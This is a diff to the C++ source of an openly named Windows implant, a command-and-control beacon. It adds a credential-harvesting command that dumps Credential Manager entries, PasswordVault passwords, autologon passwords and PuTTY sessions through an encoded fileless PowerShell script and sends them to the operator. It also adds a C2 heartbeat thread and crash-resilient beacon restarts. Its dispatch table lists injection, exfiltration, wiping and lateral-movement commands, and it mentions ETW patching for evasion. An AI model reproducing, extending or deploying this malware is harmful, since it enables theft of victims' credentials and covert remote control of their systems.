@@ -491,19 +491,18 @@ static std::wstring RunFilelessPS(const std::string& b64Input) {
 
 // =====================================================================
 //  LOLBin DISPATCH — execute without cmd.exe /C wrapper
-//  Command format: "!lol <binary> <args...>"
+//  args format: "<binary> [args...]"  e.g. "powershell -NoP -C whoami"
+//  Called directly by the dispatch table after the "!lol " prefix is
+//  stripped — no double-wrap needed.
 // =====================================================================
-static std::wstring RunLOLBin(const std::string& cmdStr) {
-    // cmdStr starts with "!lol " — strip prefix
-    std::string rest = cmdStr.substr(5); // skip "!lol "
-    // First token is the binary name
-    size_t sp = rest.find(' ');
-    std::string binName = (sp != std::string::npos) ? rest.substr(0, sp) : rest;
-    std::string args    = (sp != std::string::npos) ? rest.substr(sp + 1) : "";
+static std::wstring RunLOLBin(const std::string& args) {
+    size_t sp = args.find(' ');
+    std::string binName = (sp != std::string::npos) ? args.substr(0, sp) : args;
+    std::string rest    = (sp != std::string::npos) ? args.substr(sp + 1) : "";
 
     std::wstring binPath = ResolveLOLBin(binName);
     std::wstring cmdLine = L"\"" + binPath + L"\"";
-    if (!args.empty()) cmdLine += L" " + UTF8ToWString(args);
+    if (!rest.empty()) cmdLine += L" " + UTF8ToWString(rest);
 
     return CaptureProcessOutput(cmdLine, config::CMD_TIMEOUT_MS);
 }
@@ -759,6 +758,62 @@ static std::wstring HandleUpload(const std::string& args) {
 }
 
 // =====================================================================
+//  CREDENTIAL HARVESTING
+//  Stages:
+//    1. cmdkey /list   — Windows Credential Manager (plain text enumeration)
+//    2. PowerShell     — PasswordVault, autologon reg key, PuTTY sessions
+//  Output concatenated and returned to operator as one result blob.
+// =====================================================================
+static std::wstring HandleCreds(const std::string&) {
+    std::wstring results;
+
+    // Stage 1 — cmdkey: lists DPAPI-protected generic/domain/certificate creds
+    results += L"=== Credential Manager ===\n";
+    results += CaptureProcessOutput(L"cmdkey /list", 5000);
+
+    // Stage 2 — PowerShell dump:
+    //   - Windows.Security.Credentials.PasswordVault (Windows 8+ WinRT vault)
+    //   - HKLM Winlogon autologon (DefaultPassword)
+    //   - PuTTY saved sessions (hostname + stored username)
+    // Encoded as UTF-8 base64; RunFilelessPS re-encodes to UTF-16LE for -EncodedCommand.
+    static const char psScript[] =
+        "$r=@();"
+        "try{"
+          "[Windows.Security.Credentials.PasswordVault,"
+          "Windows.Security.Credentials,ContentType=WindowsRuntime]|Out-Null;"
+          "$v=New-Object Windows.Security.Credentials.PasswordVault;"
+          "$v.RetrieveAll()|ForEach-Object{"
+            "$_.RetrievePassword();"
+            "$r+='VAULT: '+$_.Resource+' | '+$_.UserName+' | '+$_.Password}"
+        "}catch{};"
+        "try{"
+          "$al=Get-ItemProperty "
+          "'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'"
+          " -ErrorAction SilentlyContinue;"
+          "if($al.DefaultPassword){"
+            "$r+='AUTOLOGON: '+$al.DefaultDomainName+'\\'+$al.DefaultUserName+"
+            "' | '+$al.DefaultPassword}"
+        "}catch{};"
+        "try{"
+          "Get-ChildItem 'HKCU:\\Software\\SimonTatham\\PuTTY\\Sessions'"
+          " -ErrorAction SilentlyContinue|ForEach-Object{"
+            "$p=$_.PSPath;"
+            "$h=(Get-ItemProperty $p -EA SilentlyContinue).HostName;"
+            "$u=(Get-ItemProperty $p -EA SilentlyContinue).UserName;"
+            "$r+='PUTTY: '+$_.PSChildName+' host='+$h+' user='+$u}"
+        "}catch{};"
+        "$r-join\"`n\"";
+
+    std::string b64 = Base64Encode(
+        reinterpret_cast<const BYTE*>(psScript), sizeof(psScript) - 1);
+
+    results += L"\n=== PasswordVault / Autologon / PuTTY ===\n";
+    results += RunFilelessPS(b64);
+
+    return results.empty() ? L"[no credentials found]" : results;
+}
+
+// =====================================================================
 //  COMMAND DISPATCHER — heart of the implant
 // =====================================================================
 struct CmdEntry {
@@ -769,13 +824,14 @@ struct CmdEntry {
 
 static const CmdEntry kCmdTable[] = {
     { "!ps ",         false, [](const std::string& a) { return RunFilelessPS(a); } },
-    { "!lol ",        false, [](const std::string& a) { return RunLOLBin("!lol " + a); } },
+    { "!lol ",        false, RunLOLBin },          // prefix stripped before dispatch
     { "!inject-apc ", false, HandleInjectApc },
     { "!inject ",     false, HandleInject },
     { "!migrate ",    false, HandleMigrate },
     { "!exfil ",      false, HandleExfil },
     { "!wipe",        false, HandleWipe },
     { "!lateral ",    false, HandleLateral },
+    { "!creds",       true,  HandleCreds },
     { "ps",           true,  [](const std::string&)   { return GetProcessList(); } },
     { "download ",    false, HandleDownload },
     { "upload ",      false, HandleUpload },
@@ -870,6 +926,36 @@ BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
 }
 
 // =====================================================================
+//  HEARTBEAT THREAD — independent of BeaconLoop
+//
+//  Sends GET /ping every 120 s using the same WinHttpRequest wrapper
+//  (RAII handles, hash-resolved imports, TLS, 20 s timeout — all
+//  inherited). No session state, no KV, no auth required on the worker.
+//  If the network is down the call just returns status 0 and the thread
+//  sleeps until next cycle.  A single detached thread is enough; the
+//  beacon loop restart logic handles actual command recovery.
+// =====================================================================
+static DWORD WINAPI HeartbeatThread(LPVOID) {
+    // Stagger the first ping so it doesn't race with the initial beacon
+    Sleep(30000);
+
+    std::wstring host = GetC2Host();
+    while (true) {
+        // body is std::string — pass "" not L""
+        HttpResponse resp = WinHttpRequest(
+            host, config::C2_PORT, L"GET", L"/ping", "", L"");
+        if (resp.status == 200) {
+            DebugLog(L"Heartbeat: OK");
+        } else {
+            DebugLog(L"Heartbeat: no response (status=" +
+                     std::to_wstring(resp.status) + L")");
+        }
+        Sleep(120000);
+    }
+    return 0;
+}
+
+// =====================================================================
 //  MAIN BEACON LOOP
 // =====================================================================
 VOID BeaconLoop() {
@@ -885,66 +971,84 @@ VOID BeaconLoop() {
     session.etwPatched    = PatchETW();
     session.hwbpsCleared  = ClearHardwareBreakpoints();
     session.sessionId     = GetHostnameHash() + L"|" + session.username;
-    
+
     g_SessionId = session.sessionId;
 
     DebugLog(L"Session: " + session.sessionId);
 
-    DWORD failures = 0;
-    bool  dnsMode  = false;
+    // Heartbeat runs independently — if BeaconLoop crashes and restarts,
+    // the heartbeat thread is already running and keeps the channel warm.
+    HANDLE hHb = CreateThread(nullptr, 0, HeartbeatThread, nullptr, 0, nullptr);
+    if (hHb) CloseHandle(hHb); // detach; thread owns its own lifetime
 
+    DWORD failures    = 0;
+    bool  dnsMode     = false;
+    // Separate flag — never reset after first successful beacon so the
+    // session key is not re-sent every iteration where failures == 0.
+    bool  firstBeacon = true;
+
+    // Outer loop: catch any unhandled exception, sleep, restart the
+    // beacon cycle.  failures/dnsMode persist so backoff state is
+    // preserved across restarts.
     while (true) {
-        ReapplyEvasion();
+        try {
+            ReapplyEvasion();
 
-        std::wstring task;
-        BOOL ok = FALSE;
+            std::wstring task;
+            BOOL ok = FALSE;
 
-        if (!dnsMode) {
-            ok = SendBeacon(session, task, failures == 0);
-        }
+            if (!dnsMode) {
+                ok = SendBeacon(session, task, firstBeacon);
+            }
 
-        if (!ok) {
-            ++failures;
-            DebugLog(L"Beacon failure #" + std::to_wstring(failures));
+            if (!ok) {
+                ++failures;
+                DebugLog(L"Beacon failure #" + std::to_wstring(failures));
 
-            if (failures >= config::MAX_FAILURES) {
-                // Switch to DNS fallback
-                dnsMode = true;
-                DebugLog(L"Switching to DNS fallback C2");
-                std::string dnsCmd = DnsQueryCommand(session.sessionId);
-                if (!dnsCmd.empty()) {
-                    task = UTF8ToWString(dnsCmd);
-                    ok   = TRUE;
+                if (failures >= config::MAX_FAILURES) {
+                    dnsMode = true;
+                    DebugLog(L"Switching to DNS fallback C2");
+                    std::string dnsCmd = DnsQueryCommand(session.sessionId);
+                    if (!dnsCmd.empty()) {
+                        task = UTF8ToWString(dnsCmd);
+                        ok   = TRUE;
+                    }
+                }
+            } else {
+                firstBeacon = false;          // key exchange done — never repeat
+                if (failures > 0 && !dnsMode) failures = 0;
+                dnsMode = false;
+            }
+
+            if (ok) {
+                if (task == L"sleep" || task.empty()) {
+                    // no-op
+                } else if (task == L"exit") {
+                    DebugLog(L"Exit received.");
+                    return; // clean shutdown — exit BeaconLoop entirely
+                } else {
+                    std::wstring result = ExecuteCommand(task);
+                    SendResult(session.sessionId, result);
                 }
             }
-        } else {
-            if (failures > 0 && !dnsMode) failures = 0;
-            dnsMode = false;
-        }
 
-        if (ok) {
-            if (task == L"sleep" || task.empty()) {
-                // no-op
-            } else if (task == L"exit") {
-                DebugLog(L"Exit received.");
-                break;
-            } else {
-                std::wstring result = ExecuteCommand(task);
-                SendResult(session.sessionId, result);
+            DWORD sleepMin = config::BEACON_MIN;
+            DWORD sleepMax = config::BEACON_MAX;
+            if (failures >= config::MAX_FAILURES) {
+                sleepMin *= config::BACKOFF_FACTOR;
+                sleepMax *= config::BACKOFF_FACTOR;
             }
-        }
-
-        DWORD sleepMin = config::BEACON_MIN;
-        DWORD sleepMax = config::BEACON_MAX;
-        if (failures >= config::MAX_FAILURES) {
-            sleepMin *= config::BACKOFF_FACTOR;
-            sleepMax *= config::BACKOFF_FACTOR;
-        }
-        if (dnsMode) {
-            // DNS mode: poll every 60s
-            Sleep(60000);
-        } else {
-            JitterSleep(sleepMin, sleepMax);
+            if (dnsMode) {
+                Sleep(60000);
+            } else {
+                JitterSleep(sleepMin, sleepMax);
+            }
+        } catch (const std::exception& e) {
+            DebugLog(L"BeaconLoop exception: " + UTF8ToWString(e.what()));
+            Sleep(10000);
+        } catch (...) {
+            DebugLog(L"BeaconLoop: unknown exception, restarting in 10s");
+            Sleep(10000);
         }
     }
 }
